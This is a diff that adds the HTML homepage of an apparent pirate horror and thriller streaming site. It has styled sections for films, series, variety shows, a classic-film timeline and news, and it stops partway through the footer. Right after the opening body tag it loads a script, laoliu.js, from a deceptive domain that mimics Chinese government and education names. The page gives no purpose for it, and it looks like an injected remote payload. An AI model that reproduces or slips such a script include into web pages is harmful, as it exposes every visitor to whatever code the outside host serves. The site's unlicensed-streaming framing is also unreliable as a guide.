@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="怕怕怕电影网 - 专注悬疑惊悚恐怖电影在线观看，提供最新恐怖片、惊悚片、悬疑片高清资源，随时随地畅享心跳加速的观影体验。">
+<meta name="keywords" content="怕怕怕电影网, 恐怖电影, 惊悚片, 悬疑片, 在线电影, 高清恐怖片, papapadianyingwang-h5.github.io">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+<meta name="revisit-after" content="1 days">
+<meta name="author" content="怕怕怕电影网">
+<meta property="og:title" content="怕怕怕电影网 - 悬疑惊悚恐怖电影在线观看">
+<meta property="og:description" content="怕怕怕电影网，专注悬疑惊悚恐怖电影，最新恐怖片、惊悚片、悬疑片高清在线观看平台。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://papapadianyingwang-h5.github.io">
+<meta property="og:site_name" content="怕怕怕电影网">
+<link rel="canonical" href="https://papapadianyingwang-h5.github.io">
+<title>怕怕怕电影网 - 悬疑惊悚恐怖电影在线观看 | papapadianyingwang-h5.github.io</title>
+<style>
+/* ===== 全局基础 ===== */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#07060a; --bg2:#0d0b14; --card:#141119; --card2:#1c1826;
+  --blood:#8a0303; --blood2:#c91e1e; --bone:#e8e2d0; --gray:#9a96a8;
+  --green:#00b05c; --gold:#d4a017; --purple:#6b2fa5;
+  --radius:12px; --shadow:0 8px 30px rgba(0,0,0,.6);
+}
+html{scroll-behavior:smooth; scrollbar-width:thin; scrollbar-color:#8a0303 #07060a;}
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:var(--bg); color:var(--bone); line-height:1.6; overflow-x:hidden;
+  background-image:radial-gradient(circle at 20% 10%, rgba(107,47,165,.12), transparent 40%),
+   radial-gradient(circle at 80% 80%, rgba(138,3,3,.10), transparent 40%);
+}
+a{color:inherit;text-decoration:none;}
+img{display:block;max-width:100%;}
+ul{list-style:none;}
+
+/* ===== 滚动进度条 ===== */
+#progressbar{position:fixed;top:0;left:0;height:3px;background:linear-gradient(90deg,var(--blood),var(--purple));z-index:9999;width:0;transition:width .15s;}
+
+/* ===== 顶部导航 ===== */
+header{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(7,6,10,.92);backdrop-filter:blur(14px);
+  border-bottom:1px solid rgba(138,3,3,.3);
+  transition:all .35s;
+}
+.nav-inner{max-width:1200px;margin:0 auto;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;gap:16px;}
+.logo{display:flex;align-items:center;gap:10px;font-size:1.5rem;font-weight:900;letter-spacing:1px;}
+.logo .skull{font-size:1.8rem;animation:flicker 3s infinite;}
+.logo span{background:linear-gradient(135deg,var(--blood2),var(--purple));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.nav-links{display:flex;gap:6px;align-items:center;}
+.nav-links a{
+  padding:8px 14px;border-radius:8px;font-size:.92rem;color:var(--gray);
+  transition:all .25s;position:relative;
+}
+.nav-links a:hover{color:#fff;background:rgba(138,3,3,.2);}
+.nav-links a.active{color:#fff;background:linear-gradient(135deg,var(--blood),var(--purple));}
+.menu-toggle{display:none;background:none;border:none;color:var(--bone);font-size:1.6rem;cursor:pointer;}
+
+@keyframes flicker{0%,100%{opacity:1;}45%{opacity:.4;}50%{opacity:1;}55%{opacity:.3;}60%{opacity:1;}}
+
+/* ===== Hero 首屏 ===== */
+.hero{
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  position:relative;overflow:hidden;padding:100px 20px 60px;
+  background:
+    radial-gradient(ellipse at 50% 40%, rgba(138,3,3,.25), transparent 55%),
+    radial-gradient(ellipse at 50% 90%, rgba(107,47,165,.18), transparent 50%),
+    var(--bg);
+}
+/* 烟雾粒子 */
+.hero::before{content:'';position:absolute;inset:0;
+  background-image:
+    radial-gradient(circle at 15% 70%, rgba(255,255,255,.03) 0, transparent 40%),
+    radial-gradient(circle at 85% 30%, rgba(255,255,255,.02) 0, transparent 35%);
+  animation:smoke 18s ease-in-out infinite alternate;}
+@keyframes smoke{from{transform:translate(0,0) scale(1);}to{transform:translate(-20px,-15px) scale(1.08);}}
+.hero-content{position:relative;z-index:2;text-align:center;max-width:760px;}
+.hero-badge{
+  display:inline-block;padding:6px 18px;border-radius:30px;
+  background:rgba(138,3,3,.18);border:1px solid var(--blood);
+  font-size:.85rem;color:var(--blood2);letter-spacing:2px;margin-bottom:24px;
+  animation:breath 2.5s ease-in-out infinite;
+}
+@keyframes breath{0%,100%{box-shadow:0 0 0 rgba(201,30,30,0);}50%{box-shadow:0 0 22px rgba(201,30,30,.5);}}
+.hero h1{
+  font-size:clamp(2.2rem,6vw,4.5rem);font-weight:900;line-height:1.1;
+  margin-bottom:18px;text-shadow:0 0 40px rgba(138,3,3,.6);
+}
+.hero h1 em{font-style:normal;background:linear-gradient(135deg,#ff5252,var(--purple));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.hero p{font-size:1.05rem;color:var(--gray);max-width:520px;margin:0 auto 32px;}
+.hero-stats{display:flex;justify-content:center;gap:40px;flex-wrap:wrap;margin-top:36px;}
+.hero-stats .stat{text-align:center;}
+.hero-stats .num{font-size:2rem;font-weight:900;color:var(--blood2);}
+.hero-stats .label{font-size:.82rem;color:var(--gray);letter-spacing:1px;}
+/* 浮动鬼影装饰 */
+.ghost{position:absolute;font-size:6rem;opacity:.06;animation:floaty 6s ease-in-out infinite;}
+.ghost.g1{top:12%;left:5%;} .ghost.g2{bottom:10%;right:5%;}
+@keyframes floaty{0%,100%{transform:translateY(0) rotate(-5deg);}50%{transform:translateY(-25px) rotate(5deg);}}
+
+/* ===== 通用栏目标题 ===== */
+.section{padding:70px 20px;position:relative;}
+.container{max-width:1200px;margin:0 auto;}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:36px;flex-wrap:wrap;}
+.sec-title-group{display:flex;align-items:center;gap:14px;}
+.sec-icon{font-size:2rem;filter:drop-shadow(0 0 12px rgba(201,30,30,.5));}
+.sec-title{font-size:clamp(1.5rem,3vw,2.2rem);font-weight:900;}
+.sec-title small{display:block;font-size:.82rem;color:var(--gray);font-weight:400;letter-spacing:2px;margin-top:4px;}
+.sec-more{padding:8px 18px;border:1px solid rgba(138,3,3,.4);border-radius:8px;color:var(--gray);font-size:.9rem;transition:all .25s;}
+.sec-more:hover{background:var(--blood);color:#fff;border-color:var(--blood);}
+
+/* ===== 栏目一：🔥 恐怖电影 - 交错瀑布流 ===== */
+.movie-masonry{columns:4 240px;column-gap:20px;}
+.movie-tile{break-inside:avoid;margin-bottom:20px;border-radius:var(--radius);overflow:hidden;position:relative;background:var(--card);box-shadow:var(--shadow);transition:transform .35s,box-shadow .35s;cursor:pointer;}
+.movie-tile:hover{transform:translateY(-6px);box-shadow:0 18px 45px rgba(138,3,3,.35);}
+.movie-tile .poster{position:relative;overflow:hidden;}
+.movie-tile .poster img{width:100%;height:auto;transition:filter .4s,transform .4s;filter:brightness(.8) saturate(.85);}
+.movie-tile:hover .poster img{filter:brightness(1.05) saturate(1.1);transform:scale(1.06);}
+.movie-tile .score{
+  position:absolute;top:8px;right:8px;background:rgba(7,6,10,.85);
+  color:var(--gold);font-weight:800;font-size:.85rem;padding:3px 9px;border-radius:6px;
+  border:1px solid rgba(212,160,23,.4);
+}
+.movie-tile .info{padding:12px 14px;}
+.movie-tile .info h4{font-size:.98rem;margin-bottom:5px;color:#fff;}
+.movie-tile .info p{font-size:.8rem;color:var(--gray);}
+.movie-tile .genre-tag{
+  position:absolute;top:8px;left:8px;padding:3px 10px;border-radius:5px;
+  font-size:.72rem;font-weight:700;letter-spacing:.5px;
+}
+.tag-horror{background:linear-gradient(135deg,var(--blood),#5a0202);color:#fff;}
+.tag-thriller{background:linear-gradient(135deg,var(--purple),#3d1a5e);color:#fff;}
+.tag-mystery{background:linear-gradient(135deg,#1a3a5e,#0d2137);color:#fff;}
+
+/* ===== 栏目二：📺 惊悚剧集 - 横向滑动 Coverflow ===== */
+.series-wrap{position:relative;}
+.series-track{
+  display:flex;gap:22px;overflow-x:auto;padding:10px 4px 30px;
+  scroll-snap-type:x mandatory;scrollbar-width:thin;scrollbar-color:#333 #07060a;
+}
+.series-track::-webkit-scrollbar{height:6px;} .series-track::-webkit-scrollbar-thumb{background:var(--blood);border-radius:3px;}
+.series-card{
+  flex:0 0 300px;scroll-snap-align:start;border-radius:var(--radius);
+  overflow:hidden;position:relative;background:var(--card);box-shadow:var(--shadow);
+}
+.series-card .cover{position:relative;height:180px;overflow:hidden;}
+.series-card .cover img{width:100%;height:100%;object-fit:cover;transition:transform .5s;}
+.series-card:hover .cover img{transform:scale(1.1);}
+.series-card .cover::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(to top,var(--card) 5%,transparent 70%);
+}
+.series-card .cover .epi{
+  position:absolute;top:10px;right:10px;background:rgba(0,0,0,.75);
+  color:var(--blood2);font-size:.78rem;padding:3px 9px;border-radius:5px;font-weight:700;
+}
+.series-card .s-info{padding:14px 16px 18px;}
+.series-card .s-info h4{font-size:1.02rem;margin-bottom:6px;}
+.series-card .s-info .meta{font-size:.8rem;color:var(--gray);display:flex;gap:10px;flex-wrap:wrap;}
+.series-card .s-info .meta span{background:rgba(255,255,255,.06);padding:2px 8px;border-radius:4px;}
+
+/* ===== 栏目三：🎤 午夜综艺 - 菱形网格 ===== */
+.show-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:20px;}
+.show-card{
+  background:linear-gradient(160deg,var(--card2),var(--card));
+  border-radius:var(--radius);padding:22px;position:relative;overflow:hidden;
+  border:1px solid rgba(107,47,165,.25);transition:all .35s;
+}
+.show-card::before{
+  content:'';position:absolute;top:0;left:0;width:100%;height:4px;
+  background:linear-gradient(90deg,var(--blood),var(--purple),var(--gold));
+}
+.show-card:hover{transform:translateY(-5px) rotateX(4deg);box-shadow:0 16px 40px rgba(107,47,165,.3);border-color:var(--purple);}
+.show-card .sc-icon{
+  width:52px;height:52px;border-radius:14px;display:flex;align-items:center;justify-content:center;
+  font-size:1.6rem;margin-bottom:16px;
+  background:linear-gradient(135deg,var(--blood),var(--purple));
+}
+.show-card h4{font-size:1.05rem;margin-bottom:8px;}
+.show-card p{font-size:.85rem;color:var(--gray);margin-bottom:14px;}
+.show-card .sc-foot{display:flex;justify-content:space-between;align-items:center;font-size:.8rem;}
+.show-card .sc-foot .views{color:var(--bone);}
+.show-card .sc-foot .views b{color:var(--blood2);}
+
+/* ===== 栏目四：🌸 经典老片 - 时间线 Timeline ===== */
+.timeline{position:relative;padding:10px 0;}
+.timeline::before{
+  content:'';position:absolute;left:50%;top:0;bottom:0;width:2px;
+  background:linear-gradient(to bottom,transparent,var(--blood),var(--purple),transparent);
+  transform:translateX(-50%);
+}
+.tl-item{position:relative;width:50%;padding:0 40px 36px;opacity:0;transform:translateY(30px);transition:all .6s;}
+.tl-item:nth-child(odd){left:0;text-align:right;}
+.tl-item:nth-child(even){left:50%;}
+.tl-item.visible{opacity:1;transform:translateY(0);}
+.tl-dot{
+  position:absolute;top:6px;width:16px;height:16px;border-radius:50%;
+  background:var(--blood2);border:3px solid var(--bg);box-shadow:0 0 0 3px rgba(201,30,30,.25);
+}
+.tl-item:nth-child(odd) .tl-dot{right:-8px;} .tl-item:nth-child(even) .tl-dot{left:-8px;}
+.tl-card{
+  background:var(--card);border-radius:var(--radius);padding:16px 18px;
+  border:1px solid rgba(138,3,3,.2);display:inline-block;text-align:left;max-width:340px;
+  transition:all .3s;
+}
+.tl-card:hover{border-color:var(--blood);box-shadow:var(--shadow);}
+.tl-year{font-size:.78rem;color:var(--blood2);font-weight:800;letter-spacing:1px;}
+.tl-card h4{font-size:1rem;margin:4px 0 6px;}
+.tl-card p{font-size:.82rem;color:var(--gray);}
+
+/* ===== 栏目五：📰 影视资讯 - 左右分栏 ===== */
+.news-layout{display:grid;grid-template-columns:1.4fr 1fr;gap:28px;}
+.news-feature{
+  border-radius:var(--radius);overflow:hidden;position:relative;min-height:340px;
+  display:flex;align-items:flex-end;cursor:pointer;
+}
+.news-feature .nf-img{position:absolute;inset:0;}
+.news-feature .nf-img img{width:100%;height:100%;object-fit:cover;transition:transform .6s;}
+.news-feature:hover .nf-img img{transform:scale(1.08);}
+.news-feature .nf-img::after{content:'';position:absolute;inset:0;background:linear-gradient(to top,rgba(7,6,10,.95),transparent 70%);}
+.news-feature .nf-body{position:relative;z-index:2;padding:26px;}
+.news-feature .nf-tag{display:inline-block;padding:3px 12px;border-radius:5px;background:var(--blood);font-size:.75rem;margin-bottom:10px;}
+.news-feature h3{font-size:1.4rem;margin-bottom:8px;}
+.news-feature p{font-size:.88rem;color:var(--gray);}
+.news-list{display:flex;flex-direction:column;gap:14px;}
+.news-item{
+  display:flex;gap:14px;background:var(--card);border-radius:10px;padding:12px;
+  transition:all .3s;border:1px solid transparent;
+}
+.news-item:hover{border-color:rgba(138,3,3,.35);background:var(--card2);transform:translateX(4px);}
+.news-item .date{
+  flex:0 0 52px;height:52px;border-radius:8px;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;background:linear-gradient(135deg,var(--blood),var(--purple));
+}
+.news-item .date b{font-size:1.2rem;font-weight:900;line-height:1;} .news-item .date small{font-size:.7rem;opacity:.85;}
+.news-item h5{font-size:.92rem;margin-bottom:4px;line-height:1.4;}
+.news-item span{font-size:.78rem;color:var(--gray);}
+
+/* ===== 页脚 ===== */
+footer{background:var(--bg2);border-top:1px solid rgba(138,3,3,.25);padding:50px 20px 24px;}
+.foot-inner{max-width:1200px;margin:0 auto;text-align:center;}
+.foot-logo{font-size:1.6rem;font-weight:900;margin-bottom:12px;}
+.foot-logo em{font-style:normal;background:linear-gradient(135deg,var(--blood2),var(--purple));-webkit-background-clip:text;background-clip:text;color:transparent;}
+.foot-links{display:flex;justify-content:center;gap:22px;flex-wrap:wrap;margin:20px 0;font-size:.9rem;color:var(--gray);}
+.foot-links a:hover{color:var(--blood2);}
+.foot-info{font-size:.82rem;color:#6b6878;line-height:2;}
+.foot-info a{color:#8a8599;}
+.foot-bottom{margin-top:24px;padding-top:20px;border-top:1px solid rgba(255,255,255,.06);font-size:.78rem;color:#5a5766;}
+
+/* ===== 回到顶部 ===== */
+#toTop{
+  position:fixed;bottom:28px;right:28px;width:46px;height:46px;border-radius:50%;
+  background:linear-gradient(135deg,var(--blood),var(--purple));border:none;color:#fff;
+  font-size:1.2rem;cursor:pointer;opacity:0;pointer-events:none;transition:all .3s;z-index:999;
+  box-shadow:0 6px 20px rgba(138,3,3,.4);
+}
+#toTop.show{opacity:1;pointer-events:auto;}
+#toTop:hover{transform:translateY(-3px);}
+
+/* ===== 响应式 ===== */
+@media(max-width:900px){
+  .timeline::before{left:14px;}
+  .tl-item,.tl-item:nth-child(even){width:100%;left:0;padding:0 0 28px 40px;text-align:left;}
+  .tl-item:nth-child(odd) .tl-dot,.tl-item:nth-child(even) .tl-dot{left:6px;right:auto;}
+  .tl-card{max-width:none;}
+}
+@media(max-width:768px){
+  .menu-toggle{display:block;}
+  .nav-links{
+    position:fixed;top:64px;left:0;right:0;flex-direction:column;
+    background:rgba(7,6,10,.97);backdrop-filter:blur(14px);
+    padding:20px;gap:4px;transform:translateY(-150%);transition:transform .4s;
+    border-bottom:1px solid rgba(138,3,3,.3);
+  }
+  .nav-links.open{transform:translateY(0);}
+  .nav-links a{width:100%;text-align:center;padding:12px;}
+  .hero-stats{gap:24px;}
+  .news-layout{grid-template-columns:1fr;}
+  .series-card{flex:0 0 240px;}
+}
+@media(max-width:480px){
+  .section{padding:50px 16px;}
+  .sec-head{margin-bottom:24px;}
+  .movie-masonry{columns:2 150px;column-gap:12px;}
+  .movie-tile{margin-bottom:12px;}
+  .ghost{display:none;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div id="progressbar"></div>
+
+<!-- ===== 顶部导航 ===== -->
+<header id="header">
+  <div class="nav-inner">
+    <a href="#" class="logo"><span class="skull">💀</span><span>怕怕怕电影网</span></a>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home" class="active">首页</a>
+      <a href="#movies">恐怖电影</a>
+      <a href="#series">惊悚剧集</a>
+      <a href="#shows">午夜综艺</a>
+      <a href="#classic">经典老片</a>
+      <a href="#news">影视资讯</a>
+    </nav>
+    <button class="menu-toggle" id="menuToggle" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- ===== Hero 首屏 ===== -->
+<section class="hero" id="home">
+  <span class="ghost g1">👁️</span>
+  <span class="ghost g2">🕸️</span>
+  <div class="hero-content">
+    <span class="hero-badge">⚠ 胆小慎入 · 深夜专属</span>
+    <h1>敢不敢在<span style="color:var(--blood2);">深夜</span><br>打开<em>怕怕怕电影网</em></h1>
+    <p>海量悬疑·惊悚·恐怖电影一网打尽，心跳加速的极致观影体验，每天更新不停歇。</p>
+    <div class="hero-stats">
+      <div class="stat"><div class="num">8,600+</div><div class="label">恐怖片源</div></div>
+      <div class="stat"><div class="num">1,200+</div><div class="label">惊悚剧集</div></div>
+      <div class="stat"><div class="num">99.9%</div><div class="label">高清画质</div></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目一：恐怖电影 ===== -->
+<section class="section" id="movies">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title-group">
+        <span class="sec-icon">🔥</span>
+        <div class="sec-title">热播恐怖电影<small>HORROR · THRILLER</small></div>
+      </div>
+      <a href="#" class="sec-more">查看全部 ›</a>
+    </div>
+    <div class="movie-masonry">
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-horror">恐怖</span><span class="score">9.2</span>
+          <img src="https://images.unsplash.com/photo-1505635552518-3448ff116af3?w=400&h=600&fit=crop" alt="恐怖电影"></div>
+        <div class="info"><h4>午夜凶铃</h4><p>日本 · 灵异 · 1998</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-thriller">惊悚</span><span class="score">8.8</span>
+          <img src="https://images.unsplash.com/photo-1608889175123-81e8f309ed4b?w=400&h=500&fit=crop" alt="惊悚电影"></div>
+        <div class="info"><h4>沉默的羔羊</h4><p>美国 · 犯罪 · 1991</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-mystery">悬疑</span><span class="score">9.0</span>
+          <img src="https://images.unsplash.com/photo-1574375927938-d5a98e8ffe85?w=400&h=560&fit=crop" alt="悬疑电影"></div>
+        <div class="info"><h4>消失的爱人</h4><p>美国 · 悬疑 · 2014</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-horror">恐怖</span><span class="score">8.5</span>
+          <img src="https://images.unsplash.com/photo-1518709268805-4e9042af2176?w=400&h=620&fit=crop" alt="恐怖电影"></div>
+        <div class="info"><h4>招魂</h4><p>美国 · 驱魔 · 2013</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-thriller">惊悚</span><span class="score">8.7</span>
+          <img src="https://images.unsplash.com/photo-1478720568477-152d9b164e26?w=400&h=520&fit=crop" alt="惊悚电影"></div>
+        <div class="info"><h4>致命ID</h4><p>美国 · 心理 · 2003</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-horror">恐怖</span><span class="score">7.9</span>
+          <img src="https://images.unsplash.com/photo-1598899134739-24c46f58b8c0?w=400&h=580&fit=crop" alt="恐怖电影"></div>
+        <div class="info"><h4>咒怨</h4><p>日本 · 灵异 · 2002</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-mystery">悬疑</span><span class="score">9.3</span>
+          <img src="https://images.unsplash.com/photo-1509347528160-9a9e33742cdb?w=400&h=540&fit=crop" alt="悬疑电影"></div>
+        <div class="info"><h4>盗梦空间</h4><p>美国 · 科幻悬疑 · 2010</p></div>
+      </div>
+      <div class="movie-tile">
+        <div class="poster"><span class="genre-tag tag-horror">恐怖</span><span class="score">8.3</span>
+          <img src="https://images.unsplash.com/photo-1485846234645-a62644f84728?w=400&h=600&fit=crop" alt="恐怖电影"></div>
+        <div class="info"><h4>遗传厄运</h4><p>美国 · 恐怖 · 2018</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目二：惊悚剧集 ===== -->
+<section class="section" id="series" style="background:linear-gradient(180deg,var(--bg),rgba(13,11,20,.6),var(--bg));">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title-group">
+        <span class="sec-icon">📺</span>
+        <div class="sec-title">高能惊悚剧集<small>THRILLER SERIES</small></div>
+      </div>
+      <a href="#" class="sec-more">查看全部 ›</a>
+    </div>
+    <div class="series-wrap">
+      <div class="series-track">
+        <div class="series-card">
+          <div class="cover"><span class="epi">12集全</span>
+            <img src="https://images.unsplash.com/photo-1574267432553-4b4628081c31?w=400&h=240&fit=crop" alt="惊悚剧集"></div>
+          <div class="s-info"><h4>怪奇物语</h4><div class="meta"><span>科幻</span><span>悬疑</span><span>9.2分</span></div></div>
+        </div>
+        <div class="series-card">
+          <div class="cover"><span class="epi">更新至08集</span>
+            <img src="https://images.unsplash.com/photo-1508739773434-c26b3d09e071?w=400&h=240&fit=crop" alt="惊悚剧集"></div>
+          <div class="s-info"><h4>恶鬼</h4><div class="meta"><span>韩剧</span><span>恐怖</span><span>8.6分</span></div></div>
+        </div>
+        <div class="series-card">
+          <div class="cover"><span class="epi">6集全</span>
+            <img src="https://images.unsplash.com/photo-1604975701397-6365ccbd028a?w=400&h=240&fit=crop" alt="惊悚剧集"></div>
+          <div class="s-info"><h4>悬崖上的谋杀</h4><div class="meta"><span>英剧</span><span>悬疑</span><span>8.9分</span></div></div>
+        </div>
+        <div class="series-card">
+          <div class="cover"><span class="epi">10集全</span>
+            <img src="https://images.unsplash.com/photo-1598899134739-24c46f58b8c0?w=400&h=240&fit=crop" alt="惊悚剧集"></div>
+          <div class="s-info"><h4>厄舍府的崩塌</h4><div class="meta"><span>美剧</span><span>恐怖</span><span>8.7分</span></div></div>
+        </div>
+        <div class="series-card">
+          <div class="cover"><span class="epi">更新至12集</span>
+            <img src="https://images.unsplash.com/photo-1489599162846-2f4a3c9a1e7e?w=400&h=240&fit=crop" alt="惊悚剧集"></div>
+          <div class="s-info"><h4>弥留之国的爱丽丝</h4><div class="meta"><span>日剧</span><span>惊悚</span><span>9.0分</span></div></div>
+        </div>
+        <div class="series-card">
+          <div class="cover"><span class="epi">8集全</span>
+            <img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&h=240&fit=crop" alt="惊悚剧集"></div>
+          <div class="s-info"><h4>暗黑</h4><div class="meta"><span>德剧</span><span>科幻悬疑</span><span>9.1分</span></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目三：午夜综艺 ===== -->
+<section class="section" id="shows">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title-group">
+        <span class="sec-icon">🎤</span>
+        <div class="sec-title">午夜悬疑综艺<small>MIDNIGHT SHOW</small></div>
+      </div>
+      <a href="#" class="sec-more">查看全部 ›</a>
+    </div>
+    <div class="show-grid">
+      <div class="show-card">
+        <div class="sc-icon">🔍</div>
+        <h4>密室大逃脱</h4>
+        <p>明星实景解谜，限时逃脱恐怖密室，肾上腺素飙升。</p>
+        <div class="sc-foot"><span class="views"><b>2.3亿</b> 次播放</span><span>⭐ 8.8</span></div>
+      </div>
+      <div class="show-card">
+        <div class="sc-icon">👻</div>
+        <h4>探灵档案</h4>
+        <p>深入废弃医院、古宅，用镜头记录未知的灵异现象。</p>
+        <div class="sc-foot"><span class="views"><b>1.8亿</b> 次播放</span><span>⭐ 8.5</span></div>
+      </div>
+      <div class="show-card">
+        <div class="sc-icon">🩸</div>
+        <h4>致命游戏</h4>
+        <p>真人实景推理生存赛，每一次选择都可能被淘汰。</p>
+        <div class="sc-foot"><span class="views"><b>3.1亿</b> 次播放</span><span>⭐ 9.0</span></div>
+      </div>
+      <div class="show-card">
+        <div class="sc-icon">🔮</div>
+        <h4>通灵之战</h4>
+        <p>全球通灵者同台竞技，还原案件真相的极致对决。</p>
+        <div class="sc-foot"><span class="views"><b>9600万</b> 次播放</span><span>⭐ 8.2</span></div>
+      </div>
+      <div class="show-card">
+        <div class="sc-icon">🏚️</div>
+        <h4>荒村生存记</h4>
+        <p>挑战无人荒村72小时，面对恐惧与未知的真实记录。</p>
+        <div class="sc-foot"><span class="views"><b>1.2亿</b> 次播放</span><span>⭐ 8.6</span></div>
+      </div>
+      <div class="show-card">
+        <div class="sc-icon">🎭</div>
+        <h4>剧本杀来了</h4>
+        <p>沉浸式悬疑剧本杀，明星玩家烧脑推理找出真凶。</p>
+        <div class="sc-foot"><span class="views"><b>1.5亿</b> 次播放</span><span>⭐ 8.7</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目四：经典老片时间线 ===== -->
+<section class="section" id="classic" style="background:linear-gradient(180deg,var(--bg),rgba(13,11,20,.5),var(--bg));">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title-group">
+        <span class="sec-icon">🌙</span>
+        <div class="sec-title">经典恐怖编年史<small>CLASSIC TIMELINE</small></div>
+      </div>
+      <a href="#" class="sec-more">查看全部 ›</a>
+    </div>
+    <div class="timeline">
+      <div class="tl-item">
+        <span class="tl-dot"></span>
+        <div class="tl-card"><div class="tl-year">1973 · 经典开篇</div><h4>驱魔人</h4><p>影史最具影响力的恐怖片之一，开创驱魔题材先河。</p></div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-dot"></span>
+        <div class="tl-card"><div class="tl-year">1980 · 心理恐怖</div><h4>闪灵</h4><p>库布里克执导，封闭酒店中的精神崩塌与人性深渊。</p></div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-dot"></span>
+        <div class="tl-card"><div class="tl-year">1996 · 青春杀戮</div><h4>惊声尖叫</h4><p>元恐怖片鼻祖，重新定义了现代砍杀片的结构。</p></div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-dot"></span>
+        <div class="tl-card"><div class="tl-year">1999 · 伪纪录片</div><h4>女巫布莱尔</h4><p>超低预算创造的票房神话，伪纪录片恐怖开山作。</p></div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-dot"></span>
+        <div class="tl-card"><div class="tl-year">2007 · 极限惊悚</div><h4>电锯惊魂</h4><p>竖锯游戏席卷全球，密室逃生类恐怖标杆。</p></div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-dot"></span>
+        <div class="tl-card"><div class="tl-year">2018 · 现代经典</div><h4>遗传厄运</h4><p>当代A24恐怖美学的代表，家族诅咒令人窒息。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目五：影视资讯 ===== -->
+<section class="section" id="news">
+  <div class="container">
+    <div class="sec-head">
+      <div class="sec-title-group">
+        <span class="sec-icon">📰</span>
+        <div class="sec-title">最新影视资讯<small>LATEST NEWS</small></div>
+      </div>
+      <a href="#" class="sec-more">查看全部 ›</a>
+    </div>
+    <div class="news-layout">
+      <div class="news-feature">
+        <div class="nf-img"><img src="https://images.unsplash.com/photo-1489599162846-2f4a3c9a1e7e?w=600&h=400&fit=crop" alt="影视资讯头条"></div>
+        <div class="nf-body">
+          <span class="nf-tag">独家</span>
+          <h3>2026年最值得期待的十大恐怖片单曝光</h3>
+          <p>从续集回归到新人导演的惊艳首作，今年恐怖片市场将迎来大爆发……</p>
+        </div>
+      </div>
+      <div class="news-list">
+        <div class="news-item">
+          <div class="date"><b>07</b><small>10月</small></div>
+          <div><h5>《招魂4》官宣定档，温子仁回归执导</h5><span>行业动态 · 1200 阅读</span></div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>05</b><small>10月</small></div>
+          <div><h5>经典翻拍：《午夜凶铃》好莱坞版启动</h5><span>影视资讯 · 860 阅读</span></div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>02</b><small>10月</small></div>
+          <div><h5>悬疑短剧成新风口，平台加码投资</h5><span>行业分析 · 2100 阅读</span></div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>28</b><small>09月</small></div>
+          <div><h5>恐怖片电影节获奖名单出炉，亚洲导演斩获大奖</h5><span>电影节 · 640 阅读</span></div>
+        </div>
+        <div class="news-item">
+          <div class="date"><b>25</b><small>09月</small></div>
+          <div><h5>AI换脸技术引发影视版权新争议</h5><span>科技前沿 · 1500 阅读</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer>
+  <div class="foot-inner">
+    <div class="foot-logo"><em>💀 怕怕怕电影网</em></div>
+    <p style="color:var(--gray);max-width:520px;margin:0 auto;font-size:.9rem;">怕怕怕电影网（papapadianyingwang-h5.github.io）专注悬疑、惊悚、恐怖电影与剧集在线观看，每日更新最新资源。</p>
+    <div class="foot-links">
+      <a href="#home">首页</a>
+      <a href="#movies">恐怖电影</a>
+      <a href="#series">惊悚剧集</a>
+      <a href="#shows">午夜综艺</a>
+      <a href="#classic">经典老片</a>
+      <a href="#news">影视资讯</a>
+    </div>
+    <div class="foot-info">
+      本站网址：<a href="https://papapadianyingwang-h5.github.io">https://papapadianyingwang-h5.github.io</a><br>
+      免责声明：本站仅提供影视信息展示与在线播放服务，所有内容均来自互联网公开资源。<br>
+      如有侵权请联系我们，我们将第一时间处理。
+    </div>
